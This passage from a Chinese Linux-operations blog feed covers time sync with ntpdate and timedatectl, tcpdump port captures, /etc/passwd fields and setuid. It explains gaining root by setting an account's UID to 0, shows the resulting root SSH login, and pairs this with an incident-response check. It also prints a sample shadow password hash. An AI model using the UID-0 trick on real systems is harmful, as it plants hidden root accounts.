id="更新时间-1"><a href="#更新时间-1" class="headerlink" title="更新时间"></a>更新时间</h4><p>sudo ntpdate 时间服务器域名&#x2F;ip</p><h4 id="时间服务器"><a href="#时间服务器" class="headerlink" title="时间服务器"></a>时间服务器</h4><p>中国  cn.ntp.org.cn</p><p>中国教育网  edu.ntp.org.cn</p><p>中国香港  hk.ntp.org.cn</p><p>中国台湾  tw.ntp.org.cn</p><p>日本  jp.ntp.org.cn</p><p>韩国  kr.ntp.org.cn</p><p>新加坡  sgp.ntp.org.cn</p><p>美国  us.ntp.org.cn</p><p>阿里云 ntp.aliyun.com</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">(<span class="hljs-built_in">base</span>) root@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubun<span class="hljs-symbol">tu:</span>~# ntpdate cn.ntp.org.cn<br><span class="hljs-number">20</span> May <span class="hljs-symbol">00:04</span><span class="hljs-symbol">:16</span> ntpdate[<span class="hljs-number">1815</span>]<span class="hljs-symbol">:</span> adjust <span class="hljs-built_in">time</span> server <span class="hljs-number">120.25</span>.<span class="hljs-number">115.20</span> <span class="hljs-built_in">offset</span> <span class="hljs-number">0.262073</span> <span class="hljs-built_in">sec</span><br></code></pre></td></tr></table></figure><p>报错信息</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) root@VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu:/<span class="hljs-comment"># sudo ntpdate 120.25.115.20</span><br><span class="hljs-number">19</span> May <span class="hljs-number">22</span>:<span class="hljs-number">10</span>:<span class="hljs-number">28</span> ntpdate[<span class="hljs-number">978756</span>]: <span class="hljs-literal">no</span> server suitable <span class="hljs-keyword">for</span> synchronization found<br></code></pre></td></tr></table></figure><p>定时任务周期性更新时间</p><h3 id="时间自动更新配置"><a href="#时间自动更新配置" class="headerlink" title="时间自动更新配置"></a>时间自动更新配置</h3><h4 id="查看时间自动更新配置"><a href="#查看时间自动更新配置" class="headerlink" title="查看时间自动更新配置"></a>查看时间自动更新配置</h4><p>timedatectl show </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) root@VM-8-5-ubuntu:/# timedatectl show<br><span class="hljs-attribute">Timezone</span>=Asia/Shanghai<br><span class="hljs-attribute">LocalRTC</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">CanNTP</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">NTP</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">NTPSynchronized</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">TimeUSec</span>=Fri 2022-05-20 00:10:57 CST<br><span class="hljs-attribute">RTCTimeUSec</span>=Fri 2022-05-20 00:10:57 CST<br></code></pre></td></tr></table></figure><p>NTP参数标志是否自动更新</p><p>yes ：自动更新</p><p>no：不自动更新</p><p>开启自动更新</p><p>timedatectl set-ntp yes</p><p>报错信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) root@VM-8-5-ubuntu:/# timedatectl set-ntp <span class="hljs-literal">yes</span><br>Failed <span class="hljs-keyword">to</span> <span class="hljs-built_in">set</span> ntp:<span class="hljs-built_in"> NTP </span><span class="hljs-keyword">not</span> supported<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/tcpdump/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/tcpdump/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>tcpdump 用于抓取网络数据包，Linux必须为root权限</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>tcpdump 参数</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="i"><a href="#i" class="headerlink" title="-i"></a>-i</h4><p>指定要抓取的网卡</p><h4 id="port-端口号"><a href="#port-端口号" class="headerlink" title="port 端口号"></a>port 端口号</h4><p>指定要抓取的端口(源或目的)</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">[root@localhost tmp]# tcpdump -i eth0 port <span class="hljs-number">1234</span> -v<br>dropped privs to tcpdump<br>tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">41</span>:<span class="hljs-number">03.519911</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">60</span>, id <span class="hljs-number">29943</span>, offset <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span> &gt; <span class="hljs-number">10.13.8.56</span>.search-agent: Flags [S], cksum <span class="hljs-number">0</span>xc4ec (correct), seq <span class="hljs-number">2917953384</span>, win <span class="hljs-number">64240</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">2673498046</span> ecr <span class="hljs-number">0</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">41</span>:<span class="hljs-number">03.519977</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">54948</span>, offset <span class="hljs-number">0</span>, flags [none], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.13.8.56</span>.search-agent &gt; <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span>: Flags [S.], cksum <span class="hljs-number">0</span>x9d6a (incorrect -&gt; <span class="hljs-number">0</span>x10bd), seq <span class="hljs-number">69084297</span>, ack <span class="hljs-number">2917953385</span>, win <span class="hljs-number">28960</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">1031657418</span> ecr <span class="hljs-number">2673498046</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">41:03.521252</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">60</span>, id <span class="hljs-number">29944</span>, offset <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">52</span>)<br>    <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span> &gt; <span class="hljs-number">10.13.8.56</span>.search-agent: Flags [.], cksum <span class="hljs-number">0</span>xaeb1 (correct), ack <span class="hljs-number">1</span>, win <span class="hljs-number">502</span>, options [nop,nop,TS val <span class="hljs-number">2673498048</span> ecr <span class="hljs-number">1031657418</span>], length <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">3</span> packets captured<br><span class="hljs-number">8</span> packets received by filter<br><span class="hljs-number">0</span> packets dropped by kernel<br></code></pre></td></tr></table></figure><h4 id="src-port-端口号"><a href="#src-port-端口号" class="headerlink" title="src port 端口号"></a>src port 端口号</h4><p>指定要抓取源端口</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@localhost tmp]# tcpdump -i eth0 src port <span class="hljs-number">1234</span> -v<br>dropped privs <span class="hljs-keyword">to</span> tcpdump<br>tcpdump: listening <span class="hljs-keyword">on</span> eth0, link-<span class="hljs-keyword">type</span> EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">39</span>:<span class="hljs-number">28.345555</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">50988</span>, <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>, flags [<span class="hljs-keyword">none</span>], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.<span class="hljs-keyword">search</span>-agent &gt; <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53666</span>: Flags [S.], cksum <span class="hljs-number">0x9d6a</span> (incorrect -&gt; <span class="hljs-number">0x8556</span>), seq <span class="hljs-number">2479389079</span>, ack <span class="hljs-number">1424840359</span>, win <span class="hljs-number">28960</span>, <span class="hljs-keyword">options</span> [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">1031562244</span> ecr <span class="hljs-number">2673402874</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">1</span> packet captured<br><span class="hljs-number">2</span> packets received <span class="hljs-keyword">by</span> <span class="hljs-keyword">filter</span><br><span class="hljs-number">0</span> packets dropped <span class="hljs-keyword">by</span> kernel<br></code></pre></td></tr></table></figure><h4 id="dst-port-端口号"><a href="#dst-port-端口号" class="headerlink" title="dst port 端口号"></a>dst port 端口号</h4><p>指定要抓取目的端口</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript">[root@localhost tmp]<span class="hljs-comment"># tcpdump -i eth0 dst port 1234 -v</span><br>dropped privs <span class="hljs-keyword">to</span> tcpdump<br>tcpdump: listening <span class="hljs-keyword">on</span> eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">40</span>:<span class="hljs-number">20.219983</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">60</span>, <span class="hljs-built_in">id</span> <span class="hljs-number">58829</span>, <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), <span class="hljs-built_in">length</span> <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53668</span> &gt; <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.search-agent: Flags [S], cksum <span class="hljs-number">0x0c8b</span> (correct), seq <span class="hljs-number">2144206605</span>, win <span class="hljs-number">64240</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">2673454748</span> ecr <span class="hljs-number">0</span>,nop,wscale <span class="hljs-number">7</span>], <span class="hljs-built_in">length</span> <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">40</span>:<span class="hljs-number">20.221641</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">60</span>, <span class="hljs-built_in">id</span> <span class="hljs-number">58830</span>, <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), <span class="hljs-built_in">length</span> <span class="hljs-number">52</span>)<br>    <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53668</span> &gt; <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.search-agent: Flags [.], cksum <span class="hljs-number">0x8ef6</span> (correct), ack <span class="hljs-number">3988933476</span>, win <span class="hljs-number">502</span>, options [nop,nop,TS val <span class="hljs-number">2673454749</span> ecr <span class="hljs-number">1031614118</span>], <span class="hljs-built_in">length</span> <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">2</span> packets captured<br><span class="hljs-number">3</span> packets received <span class="hljs-keyword">by</span> filter<br><span class="hljs-number">0</span> packets dropped <span class="hljs-keyword">by</span> kernel<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>passwd</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/passwd/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/passwd/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h1><p>存储账户的文件</p><p>只能是管理员修改，其他用户只有可读权限</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ll  <span class="hljs-string">/etc/passwd</span><br>-rw-r<span class="hljs-params">--r--</span> 1 root root 1414 Aug 22 09<span class="hljs-function">:16</span> <span class="hljs-string">/etc/passwd</span><br></code></pre></td></tr></table></figure><p>内容示例：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> skel]<span class="hljs-comment"># cat /etc/passwd</span><br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">adm:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">:adm</span><span class="hljs-symbol">:/var/adm</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">shutdown:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:shutdown</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/shutdown</span><br><span class="hljs-symbol">halt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:halt</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/halt</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/spool/mail</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">operator:</span><span class="hljs-symbol">x:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:operator</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">100</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">14</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:FTP</span> <span class="hljs-title class_">User</span><span class="hljs-symbol">:/var/ftp</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">99</span><span class="hljs-symbol">:</span><span class="hljs-number">99</span><span class="hljs-symbol">:Nobody</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">192</span><span class="hljs-symbol">:</span><span class="hljs-number">192</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">dbus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">81</span><span class="hljs-symbol">:System</span> message <span class="hljs-symbol">bus:</span>/<span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">polkitd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">997</span><span class="hljs-symbol">:User</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">polkitd:</span>/<span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">postfix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/postfix</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">chrony:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">996</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/chrony</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">74</span><span class="hljs-symbol">:</span><span class="hljs-number">74</span><span class="hljs-symbol">:Privilege-separated</span> <span class="hljs-variable constant_">SSH</span><span class="hljs-symbol">:/var/empty/sshd</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ntp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/etc/ntp</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">tcpdump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nscd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">28</span><span class="hljs-symbol">:</span><span class="hljs-number">28</span><span class="hljs-symbol">:NSCD</span> <span class="hljs-title class_">Daemon</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">redis:</span><span class="hljs-symbol">x:</span><span class="hljs-number">997</span><span class="hljs-symbol">:</span><span class="hljs-number">993</span><span class="hljs-symbol">:Redis</span> <span class="hljs-title class_">Database</span> <span class="hljs-title class_">Server</span><span class="hljs-symbol">:/var/lib/redis</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">dovecot:</span><span class="hljs-symbol">x:</span><span class="hljs-number">97</span><span class="hljs-symbol">:</span><span class="hljs-number">97</span><span class="hljs-symbol">:Dovecot</span> <span class="hljs-variable constant_">IMAP</span> <span class="hljs-symbol">server:</span>/usr/libexec/<span class="hljs-symbol">dovecot:</span>/sbin/nologin<br><span class="hljs-symbol">dovenull:</span><span class="hljs-symbol">x:</span><span class="hljs-number">996</span><span class="hljs-symbol">:</span><span class="hljs-number">992</span><span class="hljs-symbol">:Dovecot<span class="hljs-string">&#x27;s unauthorized user:/usr/libexec/dovecot:/sbin/nologin</span></span><br><span class="hljs-string"><span class="hljs-symbol">saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin</span></span><br><span class="hljs-string"><span class="hljs-symbol">apache:x:1001:1001::/home/apache:/bin/bash</span></span><br></code></pre></td></tr></table></figure><p>第一列：账户名</p><p>第二列：原本用于保存密码，现在密码都保存在&#x2F;etc&#x2F;shadow文件，所有都用x替代</p><p>第三列：UID，用户ID，默认管理员(root)为0，也就是0表示为特权账户；1-1000默认为系统用户；也就是正常useradd添加的用户，UID都是大于1000的。</p><p>第四列：GID，用户组ID，和UID相似</p><p>第五列：用户说明</p><p>第六列：用户家目录</p><p>第七列：用户使用的shell</p><p>权限提升：</p><p>指定用户的uid修改为0，即可成为特权用户root，也就是说会有root的权限，也有root的限制，例如：如果有设置root不可登录，提升权限的用户也不可登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt;ssh test123@<span class="hljs-number">114.132.246.141</span><br><span class="hljs-attribute">test123</span>@<span class="hljs-number">114.132.246.141</span>&#x27;s password:<br><span class="hljs-attribute">Welcome</span> to Ubuntu <span class="hljs-number">20</span>.<span class="hljs-number">04</span> LTS (GNU/Linux <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">77</span>-generic x86_64)<br><br><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure><p>默认添加的普通用户bash为&#x2F;bin&#x2F;sh，如果将bash替换为&#x2F;bin&#x2F;bash，使用被提升账户登录后就直接是root</p><p>应急响应需要注意点：</p><p>检查是否存在非root的特权账户</p><p>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/home/ubuntu# awk -F: &#x27;$<span class="hljs-number">3</span>==<span class="hljs-number">0</span>&#123;print $<span class="hljs-number">1</span>&#125;&#x27; /etc/passwd<br><span class="hljs-attribute">root</span><br><span class="hljs-attribute">test123</span><br></code></pre></td></tr></table></figure><h1 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h1><p>用户修改用户密码</p><p>默认加密方式为sha512，也就是shadow中以$6开头</p><p>test1:$6$Ld0DTWyFKov1udF7$t1zIuW.XOkBs&#x2F;SfFk1RGzLB9WMHPGgI&#x2F;bN7Q3aGsbliklViiClVLmRbaJ&#x2F;ZPzFuqp9VyoMCHnMJBJ.gLazOvf0:18953:0:99999:7:::</p><p>root@VM-8-5-ubuntu:&#x2F;home&#x2F;ubuntu# ls -lat &#x2F;usr&#x2F;bin&#x2F;passwd<br>-rwsr-xr-x 1 root root 68208 Apr 16  2020 &#x2F;usr&#x2F;bin&#x2F;passwd</p><h1 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h1><p>&#x2F;etc&#x2F;passwd第7列为用户所使用的shell，可以表示用户的部分权限</p><p>常见值为 &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh &#x2F;usr&#x2F;sbin&#x2F;nologin &#x2F;bin&#x2F;false</p><p>区别</p><p>&#x2F;bin&#x2F;bash 可以登录系统</p><p>&#x2F;bin&#x2F;sh 可以登录系统，软链接（centos下 &#x2F;bin&#x2F;sh -&gt; bash; ubuntu 下&#x2F;bin&#x2F;sh -&gt; dash）</p><p>&#x2F;usr&#x2F;sbin&#x2F;nologin 只不允许登录系统</p><p>&#x2F;bin&#x2F;false 最严格的禁止login选项，一切服务均不可用</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) root<span class="hljs-variable">@VM</span>-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-<span class="hljs-symbol">ubuntu:</span>/home/ubuntu<span class="hljs-comment"># cat /etc/passwd | grep test | more</span><br><span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-symbol">test1:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test1</span><span class="hljs-symbol">:/usr/sbin/login</span><br><span class="hljs-symbol">test2:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/test2</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure><h1 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a>setuid</h1><p>&#x2F;etc&#x2F;shadow权限为000，也就是说普通用户没有任何权限，那为什么普通用户可以修改自己的密码？</p><p>查询资料得知，是因为passwd命令存在s标记，且在文件系统中&#x2F;usr&#x2F;bin&#x2F;passwd文件归属于root:root,所以在passwd运行时将以root权限。</p><p>s标记来源setuid。</p><p>setuid</p><p>setuid设置的程序，任何用户执行时，均以该文件在文件系统中的归属者权限运行。</p><p>测试案例：</p><p>root环境下编写c文件，nc0.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span>  <span class="hljs-title class_">passwd</span> *pwd;<br>    pwd = <span class="hljs-built_in">getpwuid</span>(<span class="hljs-built_in">getuid</span>());<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s uid is: %d\n&quot;</span>,pwd-&gt;pw_name,<span class="hljs-built_in">geteuid</span>());<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">remove</span>(<span class="hljs-string">&quot;nc0del.txt&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> 